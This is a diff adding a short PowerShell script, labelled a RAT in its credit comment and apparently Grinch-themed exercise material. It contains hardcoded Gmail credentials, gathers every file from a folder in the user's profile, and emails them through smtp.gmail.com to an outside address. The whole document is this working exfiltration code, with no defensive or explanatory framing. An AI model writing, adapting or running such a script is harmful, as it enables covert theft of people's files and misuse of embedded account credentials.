@@ -1,0 +1,33 @@
+#Credits goes to @ManiarViral (https://twitter.com/maniarviral) for writing this awesome RAT!
+
+$username="Grinch.Enterprises.2021@gmail.com"
+$password="S@ntai$comingt0t0wn"
+$smtpServer = "smtp.gmail.com"
+$msg = new-object Net.Mail.MailMessage
+
+$smtp = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
+
+$smtp.EnableSsl = $true
+
+$smtp.Credentials = New-Object System.Net.NetworkCredential($username,$password)
+
+
+$msg.From = "santaspresentsdelivery@gmail.com"
+
+$msg.To.Add("Grinch.Enterprises.2021@gmail.com")
+
+$msg.Body="Your presents have arrived!"
+
+$msg.Subject = "Christmas Wishlist"
+
+$files=Get-ChildItem "$env:USERPROFILE\Pictures\Grinch2021\"
+
+Foreach($file in $files)
+{
+$attachment = new-object System.Net.Mail.Attachment -ArgumentList $file.FullName
+$msg.Attachments.Add($attachment)
+
+}
+$smtp.Send($msg)
+$attachment.Dispose();
+$msg.Dispose();
